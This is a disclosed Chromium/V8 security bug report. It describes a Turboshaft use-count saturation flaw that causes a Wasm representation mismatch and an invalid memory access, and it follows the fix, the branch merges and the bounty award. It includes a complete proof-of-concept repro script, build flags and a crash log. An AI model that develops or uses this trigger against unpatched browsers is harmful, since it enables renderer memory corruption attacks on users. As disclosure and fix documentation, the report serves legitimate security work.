# Turboshaft saturated use-count misclassification causes Wasm compressed/tagged base mismatch SIGSEGV

| Field | Value |
|-------|-------|
| **Issue ID** | [488803413](https://issues.chromium.org/issues/488803413) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler>Turboshaft |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | le...@depthfirst.com |
| **Assignee** | dm...@chromium.org |
| **Created** | 2026-03-01 |
| **Bounty** | $7,000.00 |

## Description

## VULNERABILITY DETAILS

### Summary

A Turboshaft use-count saturation bug in `Operation::IsOnlyUserOf` causes incorrect ownership conclusions once an operation's use count saturates at 255. In the WebAssembly decompression optimization path, this can keep a Phi value compressed while one of its inputs must remain tagged, producing a representation mismatch and invalid x64 addressing during generated code execution.

### Detail

Root cause is in `src/compiler/turboshaft/operations.cc`:

```
bool Operation::IsOnlyUserOf(const Operation& value, const Graph& graph) const {
  DCHECK_GE(std::count(inputs().begin(), inputs().end(), graph.Index(value)), 1);
  if (value.saturated_use_count.IsOne()) return true;
  return std::count(inputs().begin(), inputs().end(), graph.Index(value)) ==
         value.saturated_use_count.Get();
}

```

`value.saturated_use_count` is `SaturatedUint8` (`src/compiler/turboshaft/operations.h`) and saturates at 255. When the true use count is greater than 255, `Get()` still returns 255. If a specific user (here, a Phi) references the value exactly 255 times, `IsOnlyUserOf` returns true even though other users still exist.

This incorrect result is consumed in `src/compiler/turboshaft/decompression-optimization.cc` by `DecompressionAnalyzer::MarkAddressingBase`:

```
if (!input.Is<LoadOp>() || !base.IsOnlyUserOf(input, graph) ||
    !input.Cast<LoadOp>().loaded_rep.IsCompressibleTagged()) {
  keep_compressed = false;
  break;
}

```

For the crafted Wasm graph, one `LoadOp` is used 355 times total (255 in the Phi + 100 elsewhere). Due to saturation, `IsOnlyUserOf` misreports sole ownership and the Phi is kept `Compressed`, while the same `LoadOp` still has other uses requiring tagged handling. That inconsistency propagates into instruction selection and register allocation, producing generated code that treats a full tagged pointer as a compressed-offset operand in a complex addressing form, leading to immediate invalid memory access in JIT code.

## VERSION

V8 Commit: `7f3825903cdc2eb341462710172b73dc5ca9215d`

## ENVIRONMENT SETUP

Release ASan:

```
gn gen out/release_asan --args='is_asan=true is_debug=false v8_enable_test_features=false symbol_level=1'
ninja -C out/release_asan d8

```
## REPRODUCTION CASE

1. Save PoC as `repro.js`:

```
d8.file.execute("test/mjsunit/wasm/wasm-module-builder.js");

let emit_leb = (v) => {
    let res = [];
    do {
        let byte = v & 0x7f;
        v >>= 7;
        if (v !== 0) byte |= 0x80;
        res.push(byte);
    } while (v !== 0);
    return res;
};

let builder = new WasmModuleBuilder();
let structType = builder.addStruct([makeField(kWasmI32, true)]);
builder.addGlobal(wasmRefNullType(structType), true, false).exportAs("g0");
builder.addGlobal(wasmRefNullType(structType), true, false).exportAs("g1");

let body = [];

body.push(kExprGlobalGet, 0, kExprLocalSet, 1);

for (let i = 0; i < 100; i++) {
    body.push(kExprLocalGet, 1, kGCPrefix, kExprStructGet, structType, 0, kExprDrop);
}

body.push(kExprGlobalGet, 1, kExprLocalSet, 2);

body.push(kExprBlock, kWasmRefNull, structType);

for (let i = 0; i < 256; i++) {
    body.push(kExprBlock, kWasmVoid);
}

body.push(kExprLocalGet, 0, kExprBrTable);
body.push(...emit_leb(255));
for (let i = 0; i < 255; i++) {
    body.push(...emit_leb(i + 1));
}
body.push(...emit_leb(0));

for (let i = 255; i >= 0; i--) {
    body.push(kExprEnd);
    if (i === 0) {
        body.push(kExprLocalGet, 2, kExprBr, ...emit_leb(i));
    } else {
        body.push(kExprLocalGet, 1, kExprBr, ...emit_leb(i));
    }
}

body.push(kExprEnd, kGCPrefix, kExprStructGet, structType, 0);

builder.addFunction("trigger", makeSig([kWasmI32], [kWasmI32]))
  .addLocals(wasmRefNullType(structType), 3)
  .addBody(body).exportFunc();

builder.addFunction("create", makeSig([], []))
  .addBody([
    kExprI32Const, 42,
    kGCPrefix, kExprStructNew, structType,
    kExprGlobalSet, 0,
    kExprI32Const, 43,
    kGCPrefix, kExprStructNew, structType,
    kExprGlobalSet, 1
  ]).exportFunc();

let instance = builder.instantiate({});
instance.exports.create();

for (let i = 0; i <= 255; i++) {
  try { instance.exports.trigger(i); } catch(e) {}
}

console.log("SUCCESS");

```

2. Run:

```
out/release_asan/d8 --no-liftoff repro.js

```
## CRASH LOG

```
Received signal 11 <unknown> 000000000000

==== C stack trace ===============================

out/release_asan/d8(__interceptor_backtrace+0x46)[0x61f78f250b86]
out/release_asan/d8(+0x62df500)[0x61f7941ab500]
/lib/x86_64-linux-gnu/libc.so.6(+0x45330)[0x73fbf3245330]
[0x7eba3ebd0bb4]
[end of stack trace]

```
## CREDIT INFORMATION

Reporter credit: Zhenpeng (Leo) Lin at depthfirst

## Timeline

### dx...@google.com (2026-03-02)

Project: v8/v8  

Branch:  main  

Author:  Darius Mercadier [dmercadier@chromium.org](mailto:dmercadier@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7623257>

[turboshaft] Take use-count saturation into account in IsOnlyUserOf

---


Expand for full commit details
```
     
    Fixed: 488803413 
    Change-Id: I7cf0911de2338144e2d972a53c5787f186b43623 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7623257 
    Auto-Submit: Darius Mercadier <dmercadier@chromium.org> 
    Reviewed-by: Nico Hartmann <nicohartmann@chromium.org> 
    Commit-Queue: Nico Hartmann <nicohartmann@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#105521}

```

---

Files:

- M `src/compiler/turboshaft/operations.cc`
- A `test/mjsunit/wasm/regress-488803413.js`

---

Hash: [23ec84a323a2af8fcbbcdf37be3ea28a1c77f57b](https://chromiumdash.appspot.com/commit/23ec84a323a2af8fcbbcdf37be3ea28a1c77f57b)  

Date: Mon Mar 2 12:14:22 2026


---

### ch...@google.com (2026-03-02)

Dear owner, thanks for fixing this bug. We've reopened it because:

- Security bugs need the Severity (S0-S3) and the Found In set, which will enable the bots to request merges to the correct branches (as well as helping out our vulnerability reward and CVE processes). Please consult with any Chrome security contact ([security@chromium.org](mailto:security@chromium.org)) to arrange to set these labels. Severity guidelines: <https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/severity-guidelines.md#severity-guidelines-for-security-issues> FoundIn guidelines: <https://chromium.googlesource.com/chromium/src/+/main/docs/security/security-labels.md#labels-relevant-for-any-type_bug_security>
  After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### dm...@chromium.org (2026-03-02)

Thanks for the report! Seems unlikely to be exploitable (since all it can to is allow read/writes at address `cage_base*2 + some_offset`, which I doubt can be predictably utilized), but I'm not qualified to say that's it's definitely not exploitable, so I'll set severity to S1 just in case.

I'd bet that this can also affect JavaScript, although it seems pretty hard to make it happen: in all my attempts to repro in JS, the phi ends up having multiple uses because of map checks, framestates and whatnot, which prevents this optimization.

### ch...@google.com (2026-03-03)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### ch...@google.com (2026-03-03)

Dear owner, thanks for fixing this bug. We've reopened it because:

- It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines:
  - If there are multiple CLs required, please list all.
  - If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
  - If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
  - If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
  - If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
  - If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.
    After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### ch...@google.com (2026-03-03)

Dear owner, thanks for fixing this bug. We've reopened it because:

- Some CLs listed in the “Fixed By Code Changes” field are invalid and have been removed. Please provide an appropriate Gerrit url that matches the pattern: `https://<host>-review.googlesource.com/c/<repo>/+/<change_number>` or use the value 'NA' and re-mark this bug as fixed. If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### dm...@chromium.org (2026-03-03)

Gotta love this bot

### ch...@google.com (2026-03-03)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-03-03)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to extended stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M144. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M145. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M146. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### ch...@google.com (2026-03-03)

Merge review required: M146 has already been cut for stable release.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: lmenezes (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-03-03)

Merge review required: M145 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: andywu (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-03-03)

Merge review required: M144 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: alonbajayo (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### dr...@chromium.org (2026-03-04)

No crashes in Canary, approved to merge to all three milestones

### dr...@chromium.org (2026-03-04)

Actually we don't plan more M144 or M145 releases, so no point in merging there.

### va...@google.com (2026-03-05)

Issues with blintz, let's give it another try to create the child issue

### ch...@google.com (2026-03-10)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### dx...@google.com (2026-03-10)

Project: v8/v8  

Branch:  refs/branch-heads/14.6  

Author:  Darius Mercadier [dmercadier@chromium.org](mailto:dmercadier@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7650475>

Merged: [turboshaft] Take use-count saturation into account in IsOnlyUserOf

---


Expand for full commit details
```
     
    Bug: 488803413 
    (cherry picked from commit 23ec84a323a2af8fcbbcdf37be3ea28a1c77f57b) 
     
    Change-Id: I082bbd2947d85b3394fd438740401389bfade5e9 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7650475 
    Reviewed-by: Raphael Herouart <rherouart@chromium.org> 
    Auto-Submit: Darius Mercadier <dmercadier@chromium.org> 
    Commit-Queue: Raphael Herouart <rherouart@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/14.6@{#39} 
    Cr-Branched-From: e04c3a1a2543bdbee7beac8846c9cbe8f657636f-refs/heads/14.6.202@{#1} 
    Cr-Branched-From: 3b0b01e6594ec362369dc16f069012a81748c8ba-refs/heads/main@{#105132}

```

---

Files:

- M `src/compiler/turboshaft/operations.cc`
- A `test/mjsunit/wasm/regress-488803413.js`

---

Hash: [ed2551437b5a4c05e8dee8fda2f2d070ed4eccfd](https://chromiumdash.appspot.com/commit/ed2551437b5a4c05e8dee8fda2f2d070ed4eccfd)  

Date: Mon Mar 2 12:14:22 2026


---

### pe...@google.com (2026-03-10)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### pe...@google.com (2026-03-11)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-03-11)

1. https://chromium-review.git.corp.google.com/c/v8/v8/+/7655683
2. Low - There was no conflict.
3. 146
4. Yes, according to the description, the root cause was in `Operation::IsOnlyUserOf` of `src/compiler/turboshaft/operations.cc`, and the function was the same in M138 codebase. So the issue can happen in M138 as well.

```
bool Operation::IsOnlyUserOf(const Operation& value, const Graph& graph) const {
  DCHECK_GE(std::count(inputs().begin(), inputs().end(), graph.Index(value)), 1);
  if (value.saturated_use_count.IsOne()) return true;
  return std::count(inputs().begin(), inputs().end(), graph.Index(value)) ==
         value.saturated_use_count.Get();
}
```

### an...@google.com (2026-03-16)

re:[#comment21](https://issues.chromium.org/issues/488803413#comment21) Delayed until M146 soaked in Stable.

### an...@google.com (2026-04-01)

Merge approved for LTS-138

### sp...@google.com (2026-04-08)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $7000.00 for this report.

Rationale for this decision:
Baseline. Renderer RCE / memory corruption in a sandboxed process


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### dx...@google.com (2026-04-11)

Project: v8/v8  

Branch:  refs/branch-heads/13.8  

Author:  Darius Mercadier [dmercadier@chromium.org](mailto:dmercadier@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7655683>

[M138-LTS][turboshaft] Take use-count saturation into account in IsOnlyUserOf

---


Expand for full commit details
```
     
    (cherry picked from commit 23ec84a323a2af8fcbbcdf37be3ea28a1c77f57b) 
     
    Bug: 488803413 
    Change-Id: I7cf0911de2338144e2d972a53c5787f186b43623 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7623257 
    Auto-Submit: Darius Mercadier <dmercadier@chromium.org> 
    Reviewed-by: Nico Hartmann <nicohartmann@chromium.org> 
    Commit-Queue: Nico Hartmann <nicohartmann@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#105521} 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7655683 
    Reviewed-by: Darius Mercadier <dmercadier@chromium.org> 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Cr-Commit-Position: refs/branch-heads/13.8@{#106} 
    Cr-Branched-From: 61ddd471ece346840bbebbb308dceb4b4ce31b28-refs/heads/13.8.258@{#1} 
    Cr-Branched-From: fdb5de2c741658e94944f2ec1218530e98601c23-refs/heads/main@{#100480}

```

---

Files:

- M `src/compiler/turboshaft/operations.cc`
- A `test/mjsunit/wasm/regress-488803413.js`

---

Hash: [ef1b68767ce646e1721085423b1c357682c14ef9](https://chromiumdash.appspot.com/commit/ef1b68767ce646e1721085423b1c357682c14ef9)  

Date: Mon Mar 2 12:14:22 2026


---

### pe...@google.com (2026-04-29)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-04-29)

1. https://chromium-review.git.corp.google.com/c/v8/v8/+/7771647
2. Low - There was no conflict.
3. 146
4. Yes, M144 has the issue as well.

### dx...@google.com (2026-05-07)

Project: v8/v8  

Branch:  refs/branch-heads/14.4  

Author:  Darius Mercadier [dmercadier@chromium.org](mailto:dmercadier@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7771647>

[M144-LTS][turboshaft] Take use-count saturation into account in IsOnlyUserOf

---


Expand for full commit details
```
     
    (cherry picked from commit 23ec84a323a2af8fcbbcdf37be3ea28a1c77f57b) 
     
    Fixed: 488803413 
    Change-Id: I7cf0911de2338144e2d972a53c5787f186b43623 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7623257 
    Auto-Submit: Darius Mercadier <dmercadier@chromium.org> 
    Reviewed-by: Nico Hartmann <nicohartmann@chromium.org> 
    Commit-Queue: Nico Hartmann <nicohartmann@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#105521} 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7771647 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Reviewed-by: Darius Mercadier <dmercadier@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/14.4@{#80} 
    Cr-Branched-From: 80acc26727d5a34e77dabeebe7c9213ec1bd4768-refs/heads/14.4.258@{#1} 
    Cr-Branched-From: ce7e597e90f6df3fa4b6df224bc613b80c635450-refs/heads/main@{#104020}

```

---

Files:

- M `src/compiler/turboshaft/operations.cc`
- A `test/mjsunit/wasm/regress-488803413.js`

---

Hash: [f77d2dbc3ac2b22328cb56d38f53b5389ab42a48](https://chromiumdash.appspot.com/commit/f77d2dbc3ac2b22328cb56d38f53b5389ab42a48)  

Date: Mon Mar 2 12:14:22 2026


---

### ch...@google.com (2026-06-10)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/488803413)*
